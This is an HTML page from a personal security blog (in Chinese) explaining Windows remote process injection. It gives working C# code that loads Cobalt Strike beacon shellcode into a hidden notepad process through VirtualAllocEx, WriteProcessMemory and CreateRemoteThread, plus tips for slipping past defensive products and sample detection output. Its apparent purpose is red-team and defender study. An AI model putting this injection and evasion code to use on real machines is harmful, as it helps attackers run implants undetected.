@@ -1,0 +1,283 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>（远程）进程注入技术 | josyaaa</title>
+  <meta name="author" content="josyaaa">
+  
+  <meta name="description" content="（远程）进程注入技术
+VirtualAllocEx&amp;#x2F;WriteProccessMemory&amp;#x2F;CreateRemoteThread
+
+内存分配
+
+1234567891011121314151617181920212223242526VirtualAllocEx (创建零区域，大到足">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="（远程）进程注入技术"/>
+  <meta property="og:site_name" content="josyaaa"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/josyaaa/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/josyaaa/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/josyaaa/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/josyaaa/">josyaaa</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/josyaaa/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/josyaaa/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/josyaaa/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/josyaaa/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> （远程）进程注入技术</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>（远程）进程注入技术</p>
+<p>VirtualAllocEx&#x2F;WriteProccessMemory&#x2F;CreateRemoteThread</p>
+<ul>
+<li>内存分配</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">VirtualAllocEx (创建零区域，大到足以容纳shellcode，具有RWX权限，API返回内存区域的地址)</span><br><span class="line">// Spawn the target process</span><br><span class="line">var target = new Process</span><br><span class="line">&#123;</span><br><span class="line">    StartInfo = new ProcessStartInfo</span><br><span class="line">    &#123;</span><br><span class="line">        FileName = @&quot;C:\Windows\System32\notepad.exe&quot;,</span><br><span class="line">        CreateNoWindow = true,</span><br><span class="line">        WindowStyle = ProcessWindowStyle.Hidden</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">target.Start();</span><br><span class="line"></span><br><span class="line">// Read in the shellcode</span><br><span class="line">var shellcode = File.ReadAllBytes(@&quot;C:\Payloads\beacon.bin&quot;);</span><br><span class="line"></span><br><span class="line">// Allocate a region of memory</span><br><span class="line">var hMemory = Kernel32.VirtualAllocEx(</span><br><span class="line">    target.Handle,</span><br><span class="line">    IntPtr.Zero,</span><br><span class="line">    shellcode.Length,</span><br><span class="line">    Kernel32.MEM_ALLOCATION_TYPE.MEM_RESERVE | Kernel32.MEM_ALLOCATION_TYPE.MEM_COMMIT,</span><br><span class="line">    Kernel32.MEM_PROTECTION.PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">Console.WriteLine(&quot;Memory:  0x&#123;0:X&#125;&quot;, hMemory);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>write shellcode</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WriteProcessMemory(指定的缓冲区写入内存区域,此API返回一个布尔值）</span><br><span class="line"></span><br><span class="line">var success = Kernel32.WriteProcessMemory(</span><br><span class="line">    target.Handle,</span><br><span class="line">    hMemory,</span><br><span class="line">    shellcode,</span><br><span class="line">    shellcode.Length,</span><br><span class="line">    out _);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>run shellcode</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CreateRemoteThread(目标进程中创建执行shellcode新线程，此API返回创建线程的句柄)</span><br><span class="line">var hThread = Kernel32.CreateRemoteThread(</span><br><span class="line">    target.Handle,</span><br><span class="line">    null,</span><br><span class="line">    0,</span><br><span class="line">    hMemory,</span><br><span class="line">    IntPtr.Zero,</span><br><span class="line">    Kernel32.CREATE_THREAD_FLAGS.RUN_IMMEDIATELY,</span><br><span class="line">    out _);</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作安全"><a href="#操作安全" class="headerlink" title="操作安全"></a>操作安全</h3><ul>
+<li>RWX</li>
+</ul>
+<p>许多人可能会指出的第一个方面是 RWX 的初始内存分配，这对于防御性产品来说可能是一个危险信号。您可以最初将其分配为 RW，编写 shellcode，然后在调用 CreateRemoteThread 之前使用VirtualProtectEx使其成为 RX。这对于像 Beacon 这样的“普通”shellcode 非常有效，但对于 Metasploit 等框架众所周知的“编码”shellcode（如 shikata_ga_nai）则不适用。这是因为这些 shellcode 包含一个存根，它在内存中自行解码，并且这个编码过程需要写入和执行权限，这导致我们回到 RWX。</p>
+<p>Cobalt Strike 反射加载器还有一些可以在 Malleable C2 配置文件中指定的附加选项，例如userwx和cleanup。当设置为 false 时，userwx 将告诉加载程序不要为自己分配新的 RWX 内存（它将选择 RX）；当 cleanup 设置为 true 时，加载器将释放分配的用于加载自身的内存。</p>
+<ul>
+<li>R（w）区域不受模块支持</li>
+</ul>
+<p>如果你进一步检查目标进程中的内存区域，就会看到每个RX区域都由磁盘上的一个模块支持，包含shellcode的区域明显例外。如果使用RWX就很有可能是整个过程中唯一的RWX，这是因为进程从磁盘加载DLL，这种反射DLL注入方式不同会返回到磁盘上的DLL</p>
+<ul>
+<li>线程</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Rasta&gt; Get-InjectedThread</span><br><span class="line">Name                           Value</span><br><span class="line">----                           -----</span><br><span class="line">KernelPath                     C:\Windows\System32\notepad.exe</span><br><span class="line">PathMismatch                   False</span><br><span class="line">AuthenticationPackage</span><br><span class="line">AllocatedMemoryProtection      PAGE_READWRITE</span><br><span class="line">UserName                       \</span><br><span class="line">BaseAddress                    2120897789952</span><br><span class="line">IsUniqueThreadToken            False</span><br><span class="line">CommandLine                    &quot;C:\Windows\System32\notepad.exe&quot;</span><br><span class="line">Size                           4096</span><br><span class="line">ThreadId                       4524</span><br><span class="line">Integrity                      MEDIUM_MANDATORY_LEVEL</span><br><span class="line">SecurityIdentifier             S-1-5-21-3309307143-4008523374-2967785533-1001</span><br><span class="line">MemoryProtection               PAGE_READWRITE</span><br><span class="line">LogonType</span><br><span class="line">ProcessName                    notepad.exe</span><br><span class="line">ProcessId                      9256</span><br><span class="line">MemoryState                    MEM_COMMIT</span><br><span class="line">LogonId</span><br><span class="line">LogonSessionStartTime</span><br><span class="line">Path                           C:\Windows\System32\notepad.exe</span><br><span class="line">BasePriority                   8</span><br><span class="line">MemoryType                     MEM_MAPPED</span><br><span class="line">Privilege                      SeChangeNotifyPrivilege</span><br></pre></td></tr></table></figure>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/josyaaa/2022/05/12/fish-attack/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/josyaaa/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/josyaaa/2022/05/12/principles and practice/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-05-12 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2022 josyaaa
+  
+      when meets RED to BLUE ...<a href="https://josyaaa.github.io/" target="_blank">josyaaa's blog</a>,<a href="https://github.com/josyaaa?tab=repositories">josyaaa's github</a><a href="http://getbootstrap.com/" target="_blank"></a><a href="http://getbootstrap.com/" target="_blank"></a>.
+     <br> SCDAD/BIG DATA/MALWARE <a href="http://github.com/wzpan/hexo-theme-freemind/"></a> most good at leading tech
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/josyaaa/js/jquery.imagesloaded.min.js"></script>
+<script src="/josyaaa/js/gallery.js"></script>
+<script src="/josyaaa/js/bootstrap.min.js"></script>
+<script src="/josyaaa/js/main.js"></script>
+<script src="/josyaaa/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/josyaaa/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/josyaaa/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/josyaaa/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
